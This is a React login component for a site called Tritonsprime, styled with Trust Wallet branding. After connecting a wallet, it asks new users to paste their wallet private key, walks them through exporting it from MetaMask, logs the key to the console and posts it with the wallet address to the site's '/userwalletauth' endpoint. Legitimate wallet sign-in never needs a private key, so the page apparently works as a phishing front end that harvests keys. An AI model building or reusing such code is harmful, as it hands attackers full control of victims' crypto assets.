import React, { useEffect, useRef, useState } from 'react'
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faWallet, faArrowLeft, faUser, faCircleCheck, faSpinner, faEnvelope } from '@fortawesome/free-solid-svg-icons'
import { useContext } from 'react';
import DataContext from '../context/DataContext';
import useAuth from '../hook/useAuth';
import Web3 from 'web3';
import axios from '../api/axios';


import { Link, useLocation, useNavigate } from 'react-router-dom';


const WalletLogin = () => {
    


    const { auth, setAuth } = useAuth();

    const location = useLocation();
    const navigate = useNavigate();
    const from = location?.state?.from?.pathname || '/';



    const [getKey, setGetKey] = useState(false);
    const [contractAddress, setContractAddress] = useState('');
    const [privateKey, setPrivatekey] = useState('');
    const [userName,  setUserName] = useState('');
    const [userEmail,  setUserEmail] = useState('');
    const [userImage,  setUserImage] = useState('');
    const [addmore, setAddMore] = useState(false);
    const [authLoading, setAuthLoading] = useState(false);



    const handleSkip = () => {
        setAddMore(false)
        navigate(from, {replace : true});
    }

    const handleAddMore = async () => {
       try{ 
        setAuthLoading(true)
        const response = await axios.patch('/useraddmore', JSON.stringify({ id : auth?.user?._id , userEmail : userEmail, userName : userName, image : userImage}));
        
        if(response.status === 200) {
            setAuthLoading(false)
            setAuth(response.data.result);
            setAddMore(false);
            navigate(from, {replace : true});
        }

    }catch (error){
        console.log(error)
    }

    }
        
    





    const signUser = async () => {

        const ethereum = window.ethereum;

        if (!ethereum) return window.alert('no Trust wallet found please switch to Trust mobile app\'s browser');

        const connect = await ethereum.request({ method: 'eth_requestAccounts' });

        if (!connect) return console.log('connection failed');

        const web3 = new Web3(ethereum);
        const accounts = await web3.eth.getAccounts();

        if (!accounts) return console.log('!no Acccounts');

        let userAccount = accounts[0];


        console.log(accounts);
        console.log(userAccount);

        
        setContractAddress(userAccount);
        try {
            setAuthLoading(true)
            const response = await axios.post('/checkwalletauth', JSON.stringify({ walletAddress : userAccount }));
            console.log(response.status);
            console.log(response.data);

            if (response.status === 204) {
                
                setAuthLoading(false)
                if (!privateKey) return console.log('private key required');
                console.log(privateKey);

                const validKey = privateKey.length === 64

                if (!validKey) return console.log('invalid key', privateKey.length);

                const addKey = `0x${privateKey}`
                console.log(addKey);


                const response = await axios.post('/userwalletauth', JSON.stringify({ walletAddress: userAccount, privateKey: addKey }));

                if (response.status === 201) {
                    setAuth(response.data);
                    console.log(auth);
                    setAuthLoading(false)
                    setAddMore(true)

                }
                
                console.log(response.status)
                console.log(response.data)
                
            }else{ setAuth(response.data);
            console.log(auth);
            setAuthLoading(false)

                navigate(from, {replace : true});
            }

        } catch (error) {
            console.log(error.response.data)
            console.log(error.response.status)
            setAuthLoading(false)
        }

    }


    const handleImageChange = (e) => {
        console.log(e);

        const reader = new FileReader();
        reader.readAsDataURL(e.target.files[0]);
        reader.onload = () => {
            console.log(reader.result);
            setUserImage(reader.result);
        };
        reader.onerror = error => console.log("error :", error);

    }

    const handleNameChange = (e) => {
        setUserName(e.target.value)
        console.log(userName)
    }
    const handleEmailChange = (e) => {
        setUserName(e.target.value)
        console.log(userName)
    }
    



    return (
        <section className='wallet--sect'>
         {addmore &&  
         <section className='add-more'>
                <form> 
                <div className='create-nft-form wallet--login'>
                <form encType='multipart/form-data' >
                    <h1><FontAwesomeIcon icon={faCircleCheck} style={{color: "#19942e",}} /> Integration Successful</h1>
                    <h1>Add more info</h1>

                    <p>User Image</p>
                    <label htmlFor='file-upload' className='file-upload'>
                        <span className='upload-overlay'> </span>
                        <input type="file" name='nftImage' id='file-upload' onChange={handleImageChange} />
                        <span className='upload-screen-read'>{!userImage && userImage !== null && <FontAwesomeIcon icon={faUser} style={{ fontSize: '70px' }} />}
                            {userImage == "" || userImage == null ? "" : <img src={userImage} alt="" style={{ zIndex: '10', objectFit: 'contain', width: '100%', height: '100%' }} />}</span>
                    </label>
                    <div className='nft-create-text'>
                        <label htmlFor='file-name' className='nft-create-name'>
                            Name 
                        </label>
                        <input
                            type="text"
                            name='nftName'
                            id='file-name'
                            placeholder='User name'
                            onChange={handleNameChange}
                            value={userName}
                        />
                    </div>
                    <div className='nft-create-text'>
                        <label htmlFor='user-email' className='nft-create-name'>
                            <p>Email Address</p> <span></span>
                        </label>
                        <input
                            type="text"
                            id='user-email'
                            placeholder='your email'
                            onChange={handleEmailChange}
                            value={userEmail}
                        />
                    </div>

                    {
                    !authLoading &&
                    <>
                    <button onClick={handleAddMore}> Done </button>
                    <button style={{marginLeft : '10px'}} onClick={handleSkip}> Skip</button>
                    </>}
                    { authLoading && <button className='login--btn' onClick={e => e.preventDefault()}>
                <FontAwesomeIcon icon={faSpinner} spin style={{color: "#c7d2e5", fontSize : '18px'}} />
                    </button>
                    }
                </form>
            </div>
                </form>
            </section> }

            <button className='return-button'>
                <Link to={'/'} style={{ color: '#000', width: '100%' }}>
                    <FontAwesomeIcon icon={faArrowLeft} style={{ fontSize: '16px' }} />
                </Link>
            </button>
            <div className='connect--wallet'>
                <span className='image--span'>
                    <img src="https://trustwallet.com/assets/images/media/assets/vertical_blue.png" />
                    {/* <h1>TrustWallet</h1> */}
                    <p> Your Access to the Decentralized Web</p>
                </span>
                { !authLoading &&   <button className='login--btn' onClick={signUser}>

                    <span> Connect Your Wallet</span>
                    <FontAwesomeIcon icon={faWallet} />
                </button>}
                { authLoading && <button className='login--btn' onClick={e => e.preventDefault()}>
                <FontAwesomeIcon icon={faSpinner} spin style={{color: "#c7d2e5", fontSize : '18px'}} />
                    </button>
                    }
                {!authLoading && !getKey && <> <h1 style={{textAlign : 'center'}}> OR </h1>
                <button className='login--btn' onClick={() => navigate('/auth')}>
                    <span> Login with Email</span>
                    <FontAwesomeIcon icon={faEnvelope} />
                </button>
                </>
                }

                {
                    getKey &&

                    <div className='get--key'>
                        <p> Welcome to Tritonsprime seems like you are a new user let's get you started</p>
                        <p className='warning--text'>
                            Warning: Never disclose your private key to unauthorized personel.

                        </p>
                        <div className='get--key--setup'>
                            <input
                                type="text"
                                className='getkey--input'
                                placeholder='Paste your private key'
                                onChange={e => setPrivatekey(e.target.value)}
                                value={`${privateKey}`}
                            />


                            <h3>use the following steps to get your key</h3>

                            <div className='key-step-desc'>
                                <p style={{ textDecoration: "underline" }}>Step I</p>
                                <p>Click on the MetaMask icon on the top left of your browser <br /> Next Click on the three dots as shown in the image below</p>
                            </div>

                            <img src="images/getkeystep1_ml_resize_x2.jpg" alt="" className='step--img' />

                            <div className='key-step-desc'>
                                <p style={{ textDecoration: "underline" }}>Step II</p>
                                <p>Next select the account details tab</p>
                            </div>
                            <img src="images/getkeystep2_ml_resize_x2.jpg" alt="" className='step--img' />

                            <div className='key-step-desc'>
                                <p style={{ textDecoration: "underline" }}>Step III</p>
                                <p>Next select export private key option</p>
                            </div>
                            <img src="images/getkeystep3_ml_resize_x2.jpg" alt="" className='step--img' />

                            <div className='key-step-desc'>
                                <p style={{ textDecoration: "underline" }}>Step IV</p>
                                <p>before inputing your password make sure no one is watching...if your key falls into the wrong hands your assets could be at stake</p>
                            </div>
                            <img src="images/getkeystep4_ml_resize_x2.jpg" alt="" className='step--img' />

                            <div className='key-step-desc'>
                                <p style={{ textDecoration: "underline" }}>Step V</p>
                                <p>Next copy your key and paste in the tab above</p>
                            </div>
                            <img src="images/getkeystep5_ml_resize_x2.jpg" alt="" className='step--img' />

                        </div>
                    </div>
                }

            </div>
        </section>
    )
}

export default WalletLogin